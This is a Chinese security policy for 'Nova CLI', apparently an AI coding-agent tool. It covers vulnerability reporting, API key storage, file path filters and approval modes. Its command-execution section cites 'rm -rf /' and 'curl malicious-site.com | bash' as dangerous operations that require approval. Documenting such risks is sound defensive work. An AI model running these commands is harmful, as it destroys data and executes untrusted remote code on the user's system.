# 安全政策

## 支持的版本

目前，我们为以下版本提供安全更新：

| 版本 | 支持状态 |
| --- | --- |
| 0.1.x | :white_check_mark: 支持 |
| < 0.1.0 | :x: 不支持 |

## 报告漏洞

如果您发现安全漏洞，请**不要**通过公开的 GitHub Issues 报告。

### 报告流程

1. **发送邮件** - 请将安全漏洞报告发送至：[在此处填写安全邮箱]
   
2. **包含信息**：
   - 漏洞描述
   - 复现步骤
   - 影响范围
   - 可能的修复方案（如有）
   - 您的联系信息

3. **响应时间**：
   - 我们承诺在 48 小时内确认收到您的报告
   - 我们会在 7 天内提供初步评估
   - 严重漏洞会在 30 天内修复

### 披露政策

- 请勿公开披露漏洞，直到我们发布修复版本
- 我们会在修复后公开致谢（如果您愿意）
- 我们遵循 [负责任的披露](https://en.wikipedia.org/wiki/Responsible_disclosure) 原则

## 安全最佳实践

### API 密钥管理

Nova CLI 使用 AI 模型的 API 密钥。请遵循以下最佳实践：

```bash
# ✅ 推荐：使用环境变量
export ANTHROPIC_API_KEY=your-key-here
export OPENAI_API_KEY=your-key-here

# ✅ 推荐：使用 CLI 安全设置
nova auth set anthropic

# ❌ 避免：在代码中硬编码
const key = "sk-ant-..."; // 危险！

# ❌ 避免：提交到版本控制
git add .env  # 危险！
```

### 凭证存储

- API 密钥存储在 `~/.nova/credentials.json`
- 文件权限设置为 `600`（仅所有者可读写）
- 请勿共享或提交此文件

### 文件访问控制

Nova CLI 的文件操作工具具有内置安全机制：

```yaml
# .nova/security.yaml
fileFilter:
  allowedPaths:
    - ./src
    - ./tests
  deniedPaths:
    - .env
    - node_modules
    - .git
  maxFileSize: 10MB
```

### 审批模式

使用适当的审批模式：

| 模式 | 风险级别 | 使用场景 |
|------|---------|----------|
| `yolo` | 高 ⚠️ | 仅限开发环境，自动批准所有操作 |
| `default` | 中 | 默认模式，仅询问高风险操作 |
| `accepting_edits` | 中 | 自动批准文件编辑，询问其他操作 |
| `plan` | 低 | 任何操作前都需确认 |
| `smart` | 低 | AI 辅助决策 |

### 网络安全

- `web_search` 和 `web_fetch` 工具可能访问外部网络
- 请勿在隔离环境中使用这些工具
- 注意搜索查询可能包含敏感信息

### 命令执行

`execute_command` 工具可以执行任意 Shell 命令：

```bash
# ⚠️ 危险操作示例（需要审批）
execute_command: "rm -rf /"
execute_command: "curl malicious-site.com | bash"

# ✅ 安全操作示例
execute_command: "npm test"
execute_command: "git status"
```

### 沙箱环境（计划中）

未来版本将支持沙箱执行：

```yaml
# 计划功能
sandbox:
  enabled: true
  type: docker
  network: none
  memory: 2GB
  timeout: 300000
```

## 已知安全问题

### CVE-XXXX-XXXXX

目前没有已知的严重安全漏洞。

## 安全更新历史

| 日期 | 版本 | 问题 | 严重程度 |
|------|------|------|----------|
| - | - | 初始版本 | - |

## 安全审计

### 依赖审计

我们定期审计依赖项：

```bash
# 检查已知漏洞
pnpm audit

# 更新依赖
pnpm update
```

### 代码审计

- 所有代码变更都经过审查
- 敏感操作需要审批
- 文件访问受限制

## 安全功能

### 已实现

- ✅ API 密钥加密存储
- ✅ 文件路径过滤
- ✅ 命令执行审批
- ✅ 操作审计日志
- ✅ 凭证文件权限控制

### 计划中

- 🔄 Docker 沙箱执行
- 🔄 网络访问控制
- 🔄 细粒度权限系统
- 🔄 安全审计报告

## 安全联系方式

- **安全邮箱**: [在此处填写]
- **PGP 公钥**: [在此处提供]
- **响应时间**: 48 小时内确认

## 致谢

我们感谢以下安全研究人员的负责任披露：

* 暂无

---

**注意**：如果您发现安全问题，请负责任地披露。我们承诺认真对待所有安全报告。